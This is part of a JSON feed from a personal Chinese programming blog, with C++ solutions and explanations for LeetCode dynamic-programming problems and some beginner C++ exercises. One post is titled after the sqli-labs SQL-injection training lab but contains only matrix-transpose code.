            "id": "http://dpm12345.cn/posts/ccc6bc8a/",
            "url": "http://dpm12345.cn/posts/ccc6bc8a/",
            "title": "下降路径最小和",
            "date_published": "2021-11-26T07:20:40.000Z",
            "content_html": "<p>题目链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvbWluaW11bS1mYWxsaW5nLXBhdGgtc3VtLw==\">下降路径最小和</span></p>\n<p>题目详情：</p>\n<p><img data-src=\"/../../../post_images/%E4%B8%8B%E9%99%8D%E8%B7%AF%E5%BE%84%E6%9C%80%E5%B0%8F%E5%92%8C_%E9%A2%98%E7%9B%AE%E8%AF%A6%E6%83%85.jpg\"></p>\n<p>思路：由题意知，到达某一位置只能有在上一行中与它纵坐标相差1内 的位置到达，那么显然这题使用动态规划 其转移方程在一般情况下，为<br>$$<br>dp[i][j] = {min(dp[i - 1][j], dp[i - 1][j - 1], dp[i - 1][j + 1]} + matrix[i][j];<br>$$<br>而当$i=0$，<br>$$<br>dp[i][j] = matrix[i][j];<br>$$<br>$j=0$<br>$$<br>dp[i][j] = {min(dp[i - 1][j], dp[i - 1][j + 1]} + matrix[i][j];<br>$$<br>$j = n - 1$<br>$$<br>dp[i][j] = {min(dp[i - 1][j], dp[i - 1][j - 1]} + matrix[i][j];<br>$$</p>\n<h1 id=\"原始\"><a href=\"#原始\" class=\"headerlink\" title=\"原始\"></a>原始</h1><pre><code class=\"cpp\">class Solution {\npublic:\n    int minFallingPathSum(vector&lt;vector&lt;int&gt;&gt;&amp; matrix) {\n        int m = matrix.size(), n = matrix[0].size();\n        vector&lt;vector&lt;int&gt;&gt;dp(m, vector&lt;int&gt;(n));\n        for (int i = 0; i&lt;m; i++)\n        {\n            for (int j = 0; j&lt;n; j++)\n            {\n                if (i == 0)\n                {\n                    dp[i][j] = matrix[i][j];\n                }\n                else if (j == 0)\n                {\n                    dp[i][j] = min(dp[i - 1][j], dp[i - 1][j + 1]) + matrix[i][j];\n                }\n                else if (j == n - 1)\n                {\n                    dp[i][j] = min(dp[i - 1][j], dp[i - 1][j - 1]) + matrix[i][j];\n                }\n                else\n                {\n                    dp[i][j] = min(dp[i - 1][j], min(dp[i - 1][j - 1], dp[i - 1][j + 1])) + matrix[i][j];\n                }\n            }\n        }\n        return *min_element(dp[m - 1].begin(), dp[m - 1].end());\n\n    }\n};\n</code></pre>\n<h1 id=\"空间优化\"><a href=\"#空间优化\" class=\"headerlink\" title=\"空间优化\"></a>空间优化</h1><p>使用一个一维数组</p>\n<pre><code class=\"cpp\">class Solution {\npublic:\n    int minFallingPathSum(vector&lt;vector&lt;int&gt;&gt;&amp; matrix) {\n        int m = matrix.size(), n = matrix[0].size();\n        vector&lt;int&gt;dp(n + 2);              // 确保每个位置都是 min {dp [i-1],dp [i],dp [i+1]};\n        int last;                        //last 记录上一个变换的 dp [i];\n        for (int i = 0; i&lt;m; i++)\n        {\n            dp[0] = dp[n + 1] = INT_MAX;\n            last = dp[0];\n            for (int j = 0; j&lt;n; j++)\n            {\n                int temp = dp[j + 1];\n                dp[j + 1] = min(last, min(dp[j + 1], dp[j + 2])) + matrix[i][j];             \n                // 由于把原来数组增加了两个位置，\n                // 所以记录 dp 时只需更新下标 1~n+1 的 dp 值\n                last = temp;\n            }\n        }\n        return *min_element(dp.begin(), dp.end());\n\n    }\n};\n</code></pre>\n",
            "tags": [
                "动态规划"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/723dcd0c/",
            "url": "http://dpm12345.cn/posts/723dcd0c/",
            "title": "摆动序列",
            "date_published": "2021-11-26T02:20:40.000Z",
            "content_html": "<p>[题目链接:]{.orange}<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvd2lnZ2xlLXN1YnNlcXVlbmNlLw==\">摆动序列</span></p>\n<p>[题目详情:]{.orange}</p>\n<p><img data-src=\"/../../../post_images/%E6%91%86%E5%8A%A8%E5%BA%8F%E5%88%97_%E9%A2%98%E7%9B%AE%E8%AF%A6%E6%83%85.jpg\" alt=\"摆动序列_题目详情\"></p>\n<h1 id=\"动态规划\"><a href=\"#动态规划\" class=\"headerlink\" title=\"动态规划\"></a>动态规划</h1><h2 id=\"原始\"><a href=\"#原始\" class=\"headerlink\" title=\"原始\"></a>原始</h2><p>思路：关键点在于，当增添一个数成为摆动序列中的一个元素时，那么这个数要么小于，要么大于其前面的一个数 其大于或小于取决于前面一个数与再前面一个数之间的大小关系 就此，可利用动态规划的思想，分别用$up[i]$,$down[i]$记录前$i+1$个数的最长摆动序列。(其中$up[i]$记录末尾为上升的，$down[i]$记录下降的)     </p>\n<p>将题目解决方法转换为三方面：   </p>\n<ol>\n<li><p>当$nums[i]&lt;nums[i-1]$时，该元素不可添加到$up[i]$中，而对于$down[i]$，取$down[i-1]$(不加上该数),$up[i-1]+1$(加上该数)中的最大值，即<br>$$<br>down[i] = max{up[i-1]+1, down[i-1]}<br>$$</p>\n</li>\n<li><p>当$nums[i]&gt;nums[i-1]$时，该元素不可添加到$down[i]$中,而对于$up[i]$,取$up[i-1]$(不加上该数),$down[i-1]+1$(加上该数)中的最大值，即<br>$$<br>up[i] = max{up[i-1], down[i-1]+1}<br>$$</p>\n</li>\n<li><p>当$nums[i]=nums[i-1]$时，都不能加上,故<br>$$<br>up[i]=up[i-1]<br>$$</p>\n<p>$$<br>dowm[i]=down[i-1]<br>$$</p>\n</li>\n</ol>\n<p>以下为代码</p>\n<pre><code class=\"cpp\">class Solution {\npublic:\n    int wiggleMaxLength(vector&lt;int&gt;&amp; nums) {\n        int n = nums.size();\n        if (n == 1) return n;\n        vector&lt;int&gt;up(n), down(n);\n        up[0] = down[0] = 1;\n        for (int i = 1; i&lt;n; i++)\n        {\n            if (nums[i]&lt;nums[i - 1])\n            {\n                up[i] = up[i - 1];\n                down[i] = max(down[i - 1], up[i - 1] + 1);\n            }\n            else if (nums[i]&gt;nums[i - 1])\n            {\n                up[i] = max(up[i - 1], down[i - 1] + 1);\n                down[i] = down[i - 1];\n            }\n            else\n            {\n                up[i] = up[i - 1];\n                down[i] = down[i - 1];\n            }\n        }\n        return max(up[n - 1], down[n - 1]);\n    }\n};\n</code></pre>\n<h3 id=\"动态规划的空间优化\"><a href=\"#动态规划的空间优化\" class=\"headerlink\" title=\"动态规划的空间优化\"></a>动态规划的空间优化</h3><p>由于$up[i]$,$down[i]$只与下标为$i-1$的值有关，那么可以用两个变量代替数组，最后取这两个变量的最大值</p>\n<p>优化代码如下:</p>\n<pre><code class=\"cpp\">class Solution {\npublic:\n    int wiggleMaxLength(vector&lt;int&gt;&amp; nums) {\n        int n = nums.size();\n        if (n == 1) return n;\n        int up = 1, down = 1;\n        for (int i = 1; i&lt;n; i++)\n        {\n            if (nums[i]&lt;nums[i - 1])\n            {\n                down = max(down, up + 1);\n            }\n            else if (nums[i]&gt;nums[i - 1])\n            {\n                up = max(up, down + 1);\n            }\n        }\n        return max(up, down);\n    }\n};\n</code></pre>\n<h1 id=\"贪心算法\"><a href=\"#贪心算法\" class=\"headerlink\" title=\"贪心算法\"></a>贪心算法</h1><p>代码如下:</p>\n<pre><code class=\"cpp\">class Solution {\npublic:\n    int wiggleMaxLength(vector&lt;int&gt;&amp; nums) {\n        int n = nums.size();\n        if (n &lt; 2) {\n            return n;\n        }\n        int prevdiff = nums[1] - nums[0];\n        int num = prevdiff != 0 ? 2 : 1;\n        for (int i = 2; i &lt; n; i++) {\n            int diff = nums[i] - nums[i - 1];\n            if ((diff &gt; 0 &amp;&amp; prevdiff &lt;= 0) || (diff &lt; 0 &amp;&amp; prevdiff &gt;= 0)) {\n                num++;\n                prevdiff = diff;\n            }\n        }\n        return num;\n    }\n};\n</code></pre>\n<p>一开始本身的疑点：其代码行只要有<code>(diff&gt; 0 &amp;&amp; prevdiff &lt;= 0) || (diff &lt; 0 &amp;&amp; prevdiff &gt;= 0)</code>情况出现，则<code>num++</code>,<br>不会导致因为所选数不是最佳方案而造成答案错误吗？<br>// 经过思考：正因为代码段</p>\n<pre><code class=\"cpp\">int diff = nums[i] - nums[i - 1];\nif ((diff &gt; 0 &amp;&amp; prevdiff &lt;= 0) || (diff &lt; 0 &amp;&amp; prevdiff &gt;= 0)) {\n    num++;\n    prevdiff = diff;\n}\n</code></pre>\n<p>每次都会更新diff的值，也就是说每次都会更新“峰”或“谷”的值，从而使得为最佳方案</p>\n",
            "tags": [
                "动态规划",
                "贪心"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/80d626cb/",
            "url": "http://dpm12345.cn/posts/80d626cb/",
            "title": "等差数列划分",
            "date_published": "2021-11-22T07:20:40.000Z",
            "content_html": "<p>[题目链接:]{.orange}<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvYXJpdGhtZXRpYy1zbGljZXMv\">等差数列划分</span></p>\n<p>[题目详情]{.orange}</p>\n<p><img data-src=\"/../../../post_images/%E7%AD%89%E5%B7%AE%E6%95%B0%E5%88%97%E5%88%92%E5%88%86_%E9%A2%98%E7%9B%AE%E8%AF%A6%E6%83%85.png\"></p>\n<p>[【思想】数学方法 ]{.blue}</p>\n<p>[主要在于明白，数列从长度3开始，每增加一个元素，其个数从2开始加，一次加2，3，4…]{.blue}</p>\n<p>[代码如下]{.orange}</p>\n<pre><code class=\"cpp\">class Solution {\npublic:\n    int numberOfArithmeticSlices(vector&lt;int&gt;&amp; nums) {\n        if (nums.size()&lt;3)return 0;\n        int count = 1, ans = 0;\n        for (int i = 1; i&lt;nums.size() - 1; i++)\n        {\n            if (nums[i] * 2 == nums[i - 1] + nums[i + 1])\n                ans += count++;\n            else count = 1;\n        }\n        return ans;\n    }\n};\n</code></pre>\n",
            "tags": [
                "等差数列"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/6ba8ad80/",
            "url": "http://dpm12345.cn/posts/6ba8ad80/",
            "title": "整数拆分",
            "date_published": "2021-11-21T07:54:40.000Z",
            "content_html": "<p>[题目链接:]{.orange}<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvaW50ZWdlci1icmVhay8=\">整数拆分</span></p>\n<p>[题目详情]{.orange}</p>\n<p><img data-src=\"/../../../post_images/%E6%95%B4%E6%95%B0%E6%8B%86%E5%88%86_%E9%A2%98%E7%9B%AE%E8%AF%A6%E6%83%85.png\" alt=\"整数拆分_1\"></p>\n<p>[数学方法可以证明乘积最大时，因子最终都可以分解为若干个3和若干个2，且3的个数尽可能多]{.blue}</p>\n<pre><code class=\"cpp\">class Solution {\npublic:\n    int integerBreak(int n) {\n        if (n == 2)return 1;\n        if (n == 3)return 2;\n        int num_3 = n / 3, num_2 = (n % 3) / 2;\n        if (n % 3 == 1)\n        {\n            num_3--;\n            num_2 += 2;\n        }\n        return pow(3, num_3)*pow(2, num_2);\n    }\n};\n</code></pre>\n",
            "tags": [
                "滑动窗口",
                "哈希表",
                "字符串"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/68858302/",
            "url": "http://dpm12345.cn/posts/68858302/",
            "title": "信息输入",
            "date_published": "2021-11-19T06:07:26.000Z",
            "content_html": "<pre><code class=\"c++\">class Employee{\npublic:\n    /*Employee(string name, string place, string city, string code)\n        : name(name), place(place), city(city), code(code){}*/\n    Employee(){}\n    ~Employee(){}\n    void setName(string n){ name = n; }\n    void location(string p){ place = p; }\n    void City_name(string c){ city = c; }\n    void postcode(string d){ code = d; }\n    void display();\n\n\nprivate:\n    string name, place, city, code;\n\n};\nvoid Employee::display(){\n    cout &lt;&lt; name &lt;&lt; \"\\t\" &lt;&lt; place &lt;&lt; \"\\t\" &lt;&lt; city &lt;&lt; \"\\t\" &lt;&lt; code;\n}\nint main()\n{\n    \n    string name, place, city, code;\n    cout &lt;&lt; \"请输入你的姓名、地址、城市和邮政编码\\n\";\n    cin &gt;&gt; name &gt;&gt; place &gt;&gt; city &gt;&gt; code;\n    /*Employee e(name,place,city,code);*/\n    Employee e;\n    e.setName(name);\n    e.location(place);\n    e.City_name(city);\n    e.postcode(code);\n    e.display();\n\n    return 0;\n}\n</code></pre>\n<p>得到的知识：构造函数若无花括号，则只是声明，需具体实现<code>Employ：：Employ (){}</code>. 构造函数后的<code>name(name)</code>为初始化</p>\n",
            "tags": []
        },
        {
            "id": "http://dpm12345.cn/posts/c9828e60/",
            "url": "http://dpm12345.cn/posts/c9828e60/",
            "title": "坐标距离",
            "date_published": "2021-11-19T04:07:26.000Z",
            "content_html": "<pre><code class=\"c++\">//在限定时间内计算两点间的距离，并核对\n#include&lt;iostream&gt;\n#include&lt;cmath&gt;\n#include&lt;Windows.h&gt;\n#include&lt;time.h&gt;\nusing namespace std;\nclass point{\npublic:\n    point(int x, int y, int a, int b)\n        :x(x), y(y), a(a), b(b){\n        cout &lt;&lt; \"求该两点(\" &lt;&lt; x &lt;&lt; \",\" &lt;&lt; y &lt;&lt; \")\" &lt;&lt; \"  \" &lt;&lt; \"(\" &lt;&lt; a &lt;&lt; \",\" &lt;&lt; b &lt;&lt; \")的距离\\n\";\n        cout &lt;&lt; \"你有4秒钟计算答案，计算机将在4秒后给出答案\\n\";\n        Sleep(1000);\n        cout &lt;&lt; \"你还有3秒钟计算答案，计算机将在3秒后给出答案\\n\";\n        Sleep(1000);\n        cout &lt;&lt; \"你还有2秒钟计算答案，计算机将在2秒后给出答案\\n\";\n        Sleep(1000);\n        cout &lt;&lt; \"你还有1秒钟计算答案，计算机将在1秒后给出答案\\n\";\n        Sleep(1000);\n        cout &lt;&lt; \"时间到\\n\";\n        \n    }\n    friend double dist_cal(const point &amp;q);\nprivate:\n    int x, y,a,b;\n\n};\ndouble dist_cal(const point &amp;q){\n\n    return  sqrt(abs((q.x - q.a)*(q.x - q.a)) + abs((q.y - q.b)*(q.y - q.b)));\n}\n\nint main()\n{\n    int x, y, a, b;\n    int n = 1;\n    while (n)\n    {\n\n        cout &lt;&lt; \"所求的两点的坐标，请计算\\n\";\n        srand(time(NULL));\n        x = rand() % 10;\n        y = rand() % 10;\n        a = rand() % 10;\n        b = rand() % 10;\n        point A(x, y, a, b);\n        cout &lt;&lt; \"距离为\" &lt;&lt; dist_cal(A)&lt;&lt;endl&lt;&lt;\"请自行核对\"&lt;&lt;endl;\n        cout &lt;&lt; \"请选择是否继续(0为退出，其他为继续)\";\n        cin &gt;&gt; n;\n    }\n    return 0;\n}\n</code></pre>\n",
            "tags": []
        },
        {
            "id": "http://dpm12345.cn/posts/29fef1ad/",
            "url": "http://dpm12345.cn/posts/29fef1ad/",
            "title": "sqli-labs 练习",
            "date_published": "2021-11-19T02:07:26.000Z",
            "content_html": "<h1 id=\"矩阵创建及转置\"><a href=\"#矩阵创建及转置\" class=\"headerlink\" title=\"矩阵创建及转置\"></a>矩阵创建及转置</h1><pre><code class=\"c++\">#include&lt;iostream&gt;\n#include&lt;vector&gt;\n#include&lt;iomanip&gt;\nusing namespace std;\n\nvector&lt;vector&lt;int&gt;&gt; juzheng_change(vector&lt;vector&lt;int&gt;&gt;&amp;a)\n{\n    vector&lt;vector&lt;int&gt;&gt;b(a[0].size(), vector&lt;int&gt;(a.size()));\n    for (int i = 0; i &lt; a.size(); i++)\n    {\n        for (int j = 0; j &lt; a[0].size(); j++)\n        {\n            b[j][b[0].size() - i - 1] = a[i][j];         // 进行数值传递\n        }\n    }\n    return b;\n}\nint main()\n{\n    int m, n,num;\n    cout &lt;&lt; \"请分别输入矩阵的行、列数：\";\n    cin &gt;&gt; m &gt;&gt; n;                   // 确定矩阵大小\n    vector&lt;vector&lt;int&gt;&gt;a(m,vector&lt;int&gt;(n));\n    for (int i = 0; i &lt; m; i++)\n    {\n        for (int j = 0; j &lt; n; j++)\n        {\n            cin &gt;&gt; num;\n            a[i][j] = num;              // 矩阵内元素确认\n        }\n    }\n    vector&lt;vector&lt;int&gt;&gt;b(n, vector&lt;int&gt;(m));\n    b= juzheng_change(a);\n    cout &lt;&lt; \"转置后的矩阵:\" &lt;&lt; endl;\n    for (int i = 0; i &lt; n; i++)\n    {\n        for (int j = 0; j &lt; m; j++)\n        {\n            cout &lt;&lt; b[i][j] &lt;&lt; \"  \";              // 输出\n        }\n        cout &lt;&lt; endl;\n    }\n}\n</code></pre>\n<h1 id=\"对齐输出：\"><a href=\"#对齐输出：\" class=\"headerlink\" title=\"对齐输出：\"></a>对齐输出：</h1><pre><code class=\"c++\">#include&lt;iostream&gt;\n#include&lt;vector&gt;\n#include&lt;iomanip&gt;\n#include&lt;algorithm&gt;\n#include&lt;string&gt;\nusing namespace std;\n\nint cal(int n)\n{\n    return (to_string(n).length());\n}\n\nvector&lt;vector&lt;int&gt;&gt; juzheng_change(vector&lt;vector&lt;int&gt;&gt;&amp;a)\n{\n    vector&lt;vector&lt;int&gt;&gt;b(a[0].size(), vector&lt;int&gt;(a.size()));\n    for (int i = 0; i &lt; a.size(); i++)\n    {\n        for (int j = 0; j &lt; a[0].size(); j++)\n        {\n            b[j][b[0].size() - i - 1] = a[i][j];         // 进行数值传递\n        }\n    }\n    return b;\n}\nint main()\n{\n    int m, n;\n    int  num,ans;\n    cout &lt;&lt; \"请分别输入矩阵的行、列数：\";\n    cin &gt;&gt; m &gt;&gt; n;                   // 确定矩阵大小\n    vector&lt;vector&lt;int&gt;&gt;a(m,vector&lt;int&gt;(n));\n    cout &lt;&lt; \"输入矩阵各位置的值:\" &lt;&lt; endl;\n    for (int i = 0; i &lt; m; i++)\n    {\n        for (int j = 0; j &lt; n; j++)\n        {\n            cin &gt;&gt; num;\n            a[i][j] = num; // 矩阵内元素确认\n            ans = max(ans, num);\n        }\n    }\n    vector&lt;vector&lt;int&gt;&gt;b(n, vector&lt;int&gt;(m));\n    b= juzheng_change(a);\n    int x = cal(ans);\n    cout &lt;&lt; \"转置后的矩阵:\" &lt;&lt; endl;\n    for (int i = 0; i &lt; n; i++)\n    {\n        for (int j = 0; j &lt; m; j++)\n        {\n            cout &lt;&lt; setw(x)&lt;&lt;b[i][j]&lt;&lt;\" \";              // 输出\n        }\n        cout &lt;&lt; endl;\n    }\n}\n</code></pre>\n",
            "tags": []
        }
    ]
}